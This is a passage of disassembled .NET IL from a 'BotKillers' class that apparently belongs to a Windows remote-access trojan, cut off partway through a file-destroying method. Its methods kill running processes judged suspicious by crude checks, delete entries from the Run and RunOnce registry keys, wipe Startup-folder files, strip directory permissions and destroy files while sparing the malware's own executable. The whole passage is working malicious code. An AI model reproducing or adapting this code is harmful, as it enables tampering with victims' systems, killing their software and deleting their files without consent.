        IL_0036:  call       bool BotKillers::WindowIsVisible(string)
        IL_003b:  brtrue.s   IL_005b

        IL_003d:  ldloc.s    V_4
        IL_003f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_0044:  call       void BotKillers::TerminateProcess(int32)
        IL_0049:  ldloc.1
        IL_004a:  call       void BotKillers::DestroyFile(string)
        IL_004f:  ldsfld     int32 BotKillers::ProccessKilled
        IL_0054:  ldc.i4.1
        IL_0055:  add.ovf
        IL_0056:  stsfld     int32 BotKillers::ProccessKilled
        IL_005b:  leave.s    IL_0069

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0067:  leave.s    IL_0069

      }  // end handler
      IL_0069:  ldloc.3
      IL_006a:  ldc.i4.1
      IL_006b:  add.ovf
      IL_006c:  stloc.3
      IL_006d:  ldloc.3
      IL_006e:  ldloc.2
      IL_006f:  ble.s      IL_0010

      IL_0071:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ret
  } // end of method BotKillers::ScanProcess

  .method public static bool  IsFileMalicious(string fileloc) cil managed
  {
    // Code size       489 (0x1e9)
    .maxstack  3
    .locals init (bool V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             valuetype [mscorlib]System.IO.FileAttributes V_4)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.1
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.3
      IL_0009:  ldarg.0
      IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_000f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0014:  brfalse.s  IL_001f

      IL_0016:  ldc.i4.3
      IL_0017:  stloc.3
      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  br         IL_0125

      IL_001f:  ldc.i4.4
      IL_0020:  stloc.3
      IL_0021:  ldarg.0
      IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0027:  ldstr      "malware"
      IL_002c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0031:  brfalse.s  IL_003b

      IL_0033:  ldc.i4.5
      IL_0034:  stloc.3
      IL_0035:  ldarg.0
      IL_0036:  call       void BotKillers::DestroyFile(string)
      IL_003b:  ldc.i4.6
      IL_003c:  stloc.3
      IL_003d:  ldarg.0
      IL_003e:  ldstr      "Google.com"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_0053

      IL_004a:  ldc.i4.7
      IL_004b:  stloc.3
      IL_004c:  ldc.i4.0
      IL_004d:  stloc.0
      IL_004e:  br         IL_0125

      IL_0053:  ldc.i4.8
      IL_0054:  stloc.3
      IL_0055:  ldarg.0
      IL_0056:  ldstr      "Microsoft.com"
      IL_005b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0060:  brfalse.s  IL_006c

      IL_0062:  ldc.i4.s   9
      IL_0064:  stloc.3
      IL_0065:  ldc.i4.0
      IL_0066:  stloc.0
      IL_0067:  br         IL_0125

      IL_006c:  ldc.i4.s   10
      IL_006e:  stloc.3
      IL_006f:  ldarg.0
      IL_0070:  ldstr      "cmd"
      IL_0075:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_007a:  brfalse.s  IL_0086

      IL_007c:  ldc.i4.s   11
      IL_007e:  stloc.3
      IL_007f:  ldc.i4.1
      IL_0080:  stloc.0
      IL_0081:  br         IL_0125

      IL_0086:  ldc.i4.s   12
      IL_0088:  stloc.3
      IL_0089:  ldarg.0
      IL_008a:  ldstr      "wscript"
      IL_008f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0094:  brfalse.s  IL_00a0

      IL_0096:  ldc.i4.s   13
      IL_0098:  stloc.3
      IL_0099:  ldc.i4.1
      IL_009a:  stloc.0
      IL_009b:  br         IL_0125

      IL_00a0:  ldc.i4.s   14
      IL_00a2:  stloc.3
      IL_00a3:  ldarg.0
      IL_00a4:  call       string [mscorlib]System.Runtime.InteropServices.RuntimeEnvironment::GetRuntimeDirectory()
      IL_00a9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00ae:  brfalse.s  IL_00b7

      IL_00b0:  ldc.i4.s   15
      IL_00b2:  stloc.3
      IL_00b3:  ldc.i4.1
      IL_00b4:  stloc.0
      IL_00b5:  br.s       IL_0125

      IL_00b7:  ldc.i4.s   16
      IL_00b9:  stloc.3
      IL_00ba:  ldarg.0
      IL_00bb:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
      IL_00c0:  brfalse.s  IL_00c9

      IL_00c2:  ldc.i4.s   17
      IL_00c4:  stloc.3
      IL_00c5:  ldc.i4.0
      IL_00c6:  stloc.0
      IL_00c7:  br.s       IL_0125

      IL_00c9:  ldc.i4.s   18
      IL_00cb:  stloc.3
      IL_00cc:  ldarg.0
      IL_00cd:  ldstr      "USERPROFILE"
      IL_00d2:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_00d7:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00dc:  ldarg.0
      IL_00dd:  ldc.i4.s   35
      IL_00df:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00e9:  or
      IL_00ea:  brfalse.s  IL_00f3

      IL_00ec:  ldc.i4.s   19
      IL_00ee:  stloc.3
      IL_00ef:  ldc.i4.1
      IL_00f0:  stloc.0
      IL_00f1:  br.s       IL_0125

      IL_00f3:  ldc.i4.s   20
      IL_00f5:  stloc.3
      IL_00f6:  ldarg.0
      IL_00f7:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
      IL_00fc:  stloc.s    V_4
      IL_00fe:  ldc.i4.s   21
      IL_0100:  stloc.3
      IL_0101:  ldloc.s    V_4
      IL_0103:  ldc.i4.4
      IL_0104:  and
      IL_0105:  ldc.i4.4
      IL_0106:  bne.un.s   IL_010f

      IL_0108:  ldc.i4.s   22
      IL_010a:  stloc.3
      IL_010b:  ldc.i4.1
      IL_010c:  stloc.0
      IL_010d:  br.s       IL_0125

      IL_010f:  ldc.i4.s   23
      IL_0111:  stloc.3
      IL_0112:  ldloc.s    V_4
      IL_0114:  ldc.i4.2
      IL_0115:  and
      IL_0116:  ldc.i4.2
      IL_0117:  bne.un.s   IL_0120

      IL_0119:  ldc.i4.s   24
      IL_011b:  stloc.3
      IL_011c:  ldc.i4.1
      IL_011d:  stloc.0
      IL_011e:  br.s       IL_0125

      IL_0120:  ldc.i4.s   25
      IL_0122:  stloc.3
      IL_0123:  ldc.i4.0
      IL_0124:  stloc.0
      IL_0125:  leave      IL_01df

      IL_012a:  ldloc.2
      IL_012b:  ldc.i4.1
      IL_012c:  add
      IL_012d:  ldc.i4.0
      IL_012e:  stloc.2
      IL_012f:  switch     ( 
                            IL_01a0,
                            IL_0000,
                            IL_0007,
                            IL_0016,
                            IL_001f,
                            IL_0033,
                            IL_003b,
                            IL_004a,
                            IL_0053,
                            IL_0062,
                            IL_006c,
                            IL_007c,
                            IL_0086,
                            IL_0096,
                            IL_00a0,
                            IL_00b0,
                            IL_00b7,
                            IL_00c2,
                            IL_00c9,
                            IL_00ec,
                            IL_00f3,
                            IL_00fe,
                            IL_0108,
                            IL_010f,
                            IL_0119,
                            IL_0120,
                            IL_0125)
      IL_01a0:  leave.s    IL_01d4

      IL_01a2:  ldloc.3
      IL_01a3:  stloc.2
      IL_01a4:  ldloc.1
      IL_01a5:  switch     ( 
                            IL_01b2,
                            IL_012a)
      IL_01b2:  leave.s    IL_01d4

    }  // end .try
    filter
    {
      IL_01b4:  isinst     [mscorlib]System.Exception
      IL_01b9:  ldnull
      IL_01ba:  cgt.un
      IL_01bc:  ldloc.1
      IL_01bd:  ldc.i4.0
      IL_01be:  cgt.un
      IL_01c0:  and
      IL_01c1:  ldloc.2
      IL_01c2:  ldc.i4.0
      IL_01c3:  ceq
      IL_01c5:  and
      IL_01c6:  endfilter
    }  // end filter
    {  // handler
      IL_01c8:  castclass  [mscorlib]System.Exception
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d2:  leave.s    IL_01a2

    }  // end handler
    IL_01d4:  ldc.i4     0x800a0033
    IL_01d9:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01de:  throw

    IL_01df:  ldloc.2
    IL_01e0:  brfalse.s  IL_01e7

    IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01e7:  ldloc.0
    IL_01e8:  ret
  } // end of method BotKillers::IsFileMalicious

  .method public static void  KillFile(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.1
      IL_0010:  ldc.i4.0
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::KillFile

  .method public static bool  WindowIsVisible(string WinTitle) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  2
    .locals init (bool V_0)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  ldarg.0
      IL_0002:  call       native int BotKillers::FindWindow(string,
                                                             string)
      IL_0007:  call       bool BotKillers::IsWindowVisible(native int)
      IL_000c:  stloc.0
      IL_000d:  leave.s    IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0014:  ldc.i4.0
      IL_0015:  stloc.0
      IL_0016:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001b:  leave.s    IL_001d

    }  // end handler
    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method BotKillers::WindowIsVisible

  .method public static void  RunStartupKiller() cil managed
  {
    // Code size       458 (0x1ca)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             class [mscorlib]System.Collections.Generic.IEnumerator`1<string> V_4,
             string V_5)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_000e:  ldc.i4.1
      IL_000f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0014:  ldc.i4.3
      IL_0015:  stloc.2
      IL_0016:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_001b:  ldc.i4.1
      IL_001c:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0021:  ldc.i4.4
      IL_0022:  stloc.2
      IL_0023:  call       bool BotKillers::IsAdmin()
      IL_0028:  brfalse.s  IL_0044

      IL_002a:  ldc.i4.5
      IL_002b:  stloc.2
      IL_002c:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_0031:  ldc.i4.2
      IL_0032:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0037:  ldc.i4.6
      IL_0038:  stloc.2
      IL_0039:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_003e:  ldc.i4.2
      IL_003f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0044:  ldc.i4.7
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.7
      IL_0047:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004c:  ldstr      "\\"
      IL_0051:  ldsfld     string j.OK::RG
      IL_0056:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005b:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0060:  stloc.3
      IL_0061:  ldc.i4.8
      IL_0062:  stloc.2
      IL_0063:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0068:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_006d:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0072:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0077:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_007c:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Programs()
      IL_0081:  ldstr      "\\Startup"
      IL_0086:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008b:  callvirt   instance class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string> [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::GetFiles(string)
      IL_0090:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string>::GetEnumerator()
      IL_0095:  stloc.s    V_4
      IL_0097:  br.s       IL_0111

      IL_0099:  ldloc.s    V_4
      IL_009b:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<string>::get_Current()
      IL_00a0:  stloc.s    V_5
      IL_00a2:  ldc.i4.s   9
      IL_00a4:  stloc.2
      IL_00a5:  ldloc.s    V_5
      IL_00a7:  ldsfld     string j.OK::RG
      IL_00ac:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00b1:  ldc.i4.0
      IL_00b2:  ceq
      IL_00b4:  ldloc.s    V_5
      IL_00b6:  ldloc.3
      IL_00b7:  ldstr      ".url"
      IL_00bc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00c1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00c6:  ldc.i4.0
      IL_00c7:  ceq
      IL_00c9:  and
      IL_00ca:  ldloc.s    V_5
      IL_00cc:  ldstr      ".ini"
      IL_00d1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00d6:  ldc.i4.0
      IL_00d7:  ceq
      IL_00d9:  and
      IL_00da:  brfalse.s  IL_010e

      IL_00dc:  ldc.i4.s   10
      IL_00de:  stloc.2
      IL_00df:  ldloc.s    V_5
      IL_00e1:  call       void BotKillers::DestroyFile(string)
      IL_00e6:  ldc.i4.s   11
      IL_00e8:  stloc.2
      IL_00e9:  ldc.i4.s   50
      IL_00eb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f0:  ldc.i4.s   12
      IL_00f2:  stloc.2
      IL_00f3:  ldloc.s    V_5
      IL_00f5:  call       void BotKillers::DestroyFile(string)
      IL_00fa:  ldc.i4.s   13
      IL_00fc:  stloc.2
      IL_00fd:  ldc.i4.s   50
      IL_00ff:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0104:  ldc.i4.s   14
      IL_0106:  stloc.2
      IL_0107:  ldloc.s    V_5
      IL_0109:  call       void BotKillers::DestroyFile(string)
      IL_010e:  ldc.i4.s   15
      IL_0110:  stloc.2
      IL_0111:  ldloc.s    V_4
      IL_0113:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0118:  brtrue     IL_0099

      IL_011d:  ldc.i4.s   16
      IL_011f:  stloc.2
      IL_0120:  ldloc.s    V_4
      IL_0122:  brfalse.s  IL_012b

      IL_0124:  ldloc.s    V_4
      IL_0126:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_012b:  leave      IL_01c1

      IL_0130:  ldloc.1
      IL_0131:  ldc.i4.1
      IL_0132:  add
      IL_0133:  ldc.i4.0
      IL_0134:  stloc.1
      IL_0135:  switch     ( 
                            IL_0182,
                            IL_0000,
                            IL_0007,
                            IL_0014,
                            IL_0021,
                            IL_002a,
                            IL_0037,
                            IL_0044,
                            IL_0061,
                            IL_00a2,
                            IL_00dc,
                            IL_00e6,
                            IL_00f0,
                            IL_00fa,
                            IL_0104,
                            IL_010e,
                            IL_011d,
                            IL_012b)
      IL_0182:  leave.s    IL_01b6

      IL_0184:  ldloc.2
      IL_0185:  stloc.1
      IL_0186:  ldloc.0
      IL_0187:  switch     ( 
                            IL_0194,
                            IL_0130)
      IL_0194:  leave.s    IL_01b6

    }  // end .try
    filter
    {
      IL_0196:  isinst     [mscorlib]System.Exception
      IL_019b:  ldnull
      IL_019c:  cgt.un
      IL_019e:  ldloc.0
      IL_019f:  ldc.i4.0
      IL_01a0:  cgt.un
      IL_01a2:  and
      IL_01a3:  ldloc.1
      IL_01a4:  ldc.i4.0
      IL_01a5:  ceq
      IL_01a7:  and
      IL_01a8:  endfilter
    }  // end filter
    {  // handler
      IL_01aa:  castclass  [mscorlib]System.Exception
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  leave.s    IL_0184

    }  // end handler
    IL_01b6:  ldc.i4     0x800a0033
    IL_01bb:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01c0:  throw

    IL_01c1:  ldloc.1
    IL_01c2:  brfalse.s  IL_01c9

    IL_01c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01c9:  ret
  } // end of method BotKillers::RunStartupKiller

  .method public static void  StartupFucker(string regkey,
                                            int32 'type') cil managed
  {
    // Code size       273 (0x111)
    .maxstack  5
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  ldc.i4.1
      IL_0002:  bne.un.s   IL_0010

      IL_0004:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0009:  ldarg.0
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_000f:  stloc.0
      IL_0010:  ldarg.1
      IL_0011:  ldc.i4.2
      IL_0012:  bne.un.s   IL_0020

      IL_0014:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_0019:  ldarg.0
      IL_001a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_001f:  stloc.0
      IL_0020:  ldloc.0
      IL_0021:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0026:  stloc.1
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.2
      IL_0029:  br         IL_00f9

      IL_002e:  ldloc.1
      IL_002f:  ldloc.2
      IL_0030:  ldelem.ref
      IL_0031:  stloc.3
      .try
      {
        IL_0032:  ldloc.0
        IL_0033:  ldloc.3
        IL_0034:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
        IL_0039:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_003e:  stloc.s    V_4
        IL_0040:  ldloc.s    V_4
        IL_0042:  ldstr      "-"
        IL_0047:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_004c:  brfalse.s  IL_008f

        IL_004e:  ldloc.s    V_4
        IL_0050:  ldstr      "\""
        IL_0055:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_005a:  brfalse.s  IL_006e

        IL_005c:  ldloc.s    V_4
        IL_005e:  ldstr      "\""
        IL_0063:  ldsfld     string [mscorlib]System.String::Empty
        IL_0068:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                              string)
        IL_006d:  pop
        IL_006e:  nop
        .try
        {
          IL_006f:  ldloc.s    V_4
          IL_0071:  ldstr      " -"
          IL_0076:  ldc.i4.m1
          IL_0077:  ldc.i4.0
          IL_0078:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                    string,
                                                                                                    int32,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
          IL_007d:  ldc.i4.0
          IL_007e:  ldelem.ref
          IL_007f:  stloc.s    V_4
          IL_0081:  leave.s    IL_008f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008d:  leave.s    IL_008f

        }  // end handler
        IL_008f:  ldloc.s    V_4
        IL_0091:  ldstr      "\""
        IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_009b:  brfalse.s  IL_00b8

        IL_009d:  ldloc.s    V_4
        IL_009f:  ldc.i4.1
        IL_00a0:  newarr     [mscorlib]System.Char
        IL_00a5:  dup
        IL_00a6:  ldc.i4.0
        IL_00a7:  ldc.i4.s   34
        IL_00a9:  stelem.i2
        IL_00aa:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
        IL_00af:  ldc.i4.1
        IL_00b0:  ldelem.ref
        IL_00b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_00b6:  stloc.s    V_4
        IL_00b8:  ldloc.s    V_4
        IL_00ba:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_00bf:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_00c4:  brtrue.s   IL_00e7

        IL_00c6:  ldarg.1
        IL_00c7:  ldloc.3
        IL_00c8:  ldarg.0
        IL_00c9:  ldloc.s    V_4
        IL_00cb:  call       void BotKillers::RemoveKey(int32,
                                                        string,
                                                        string,
                                                        string)
        IL_00d0:  ldloc.s    V_4
        IL_00d2:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
        IL_00d7:  brtrue.s   IL_00e7

        IL_00d9:  ldloc.s    V_4
        IL_00db:  call       void BotKillers::TerminateProcessPath(string)
        IL_00e0:  ldloc.s    V_4
        IL_00e2:  call       void BotKillers::DestroyFile(string)
        IL_00e7:  leave.s    IL_00f5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f3:  leave.s    IL_00f5

      }  // end handler
      IL_00f5:  ldloc.2
      IL_00f6:  ldc.i4.1
      IL_00f7:  add.ovf
      IL_00f8:  stloc.2
      IL_00f9:  ldloc.2
      IL_00fa:  ldloc.1
      IL_00fb:  ldlen
      IL_00fc:  conv.i4
      IL_00fd:  blt        IL_002e

      IL_0102:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0104:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  ret
  } // end of method BotKillers::StartupFucker

  .method public static void  RemoveKey(int32 Reg,
                                        string file,
                                        string reglocation,
                                        string FileLocation) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]Microsoft.Win32.RegistryKey V_1,
             class [mscorlib]Microsoft.Win32.RegistryKey V_2)
    .try
    {
      IL_0000:  ldarg.2
      IL_0001:  stloc.0
      IL_0002:  ldnull
      IL_0003:  stloc.1
      IL_0004:  ldarg.0
      IL_0005:  ldc.i4.1
      IL_0006:  bne.un.s   IL_0017

      IL_0008:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0014:  stloc.1
      IL_0015:  br.s       IL_0024

      IL_0017:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_001c:  ldloc.0
      IL_001d:  ldc.i4.1
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0023:  stloc.1
      IL_0024:  ldloc.1
      IL_0025:  stloc.2
      .try
      {
        IL_0026:  ldloc.1
        IL_0027:  brfalse.s  IL_0030

        IL_0029:  ldloc.1
        IL_002a:  ldarg.1
        IL_002b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
        IL_0030:  leave.s    IL_003c

      }  // end .try
      finally
      {
        IL_0032:  ldloc.2
        IL_0033:  brfalse.s  IL_003b

        IL_0035:  ldloc.2
        IL_0036:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_003b:  endfinally
      }  // end handler
      IL_003c:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ret
  } // end of method BotKillers::RemoveKey

  .method public static void  DestroyFile(string path) cil managed noinlining nooptimization
  {
    // Code size       157 (0x9d)
    .maxstack  6
    .locals init (class [mscorlib]System.Random V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0006:  brfalse    IL_008e

      IL_000b:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0010:  stloc.0
      .try
      {
        IL_0011:  ldarg.0
        IL_0012:  call       void BotKillers::AllowAccess(string)
        IL_0017:  call       class My.MyComputer My.MyProject::get_Computer()
        IL_001c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
        IL_0021:  ldarg.0
        IL_0022:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0027:  ldloc.0
        IL_0028:  ldc.i4     0x2710
        IL_002d:  ldc.i4     0x15f90
        IL_0032:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                          int32)
        IL_0037:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
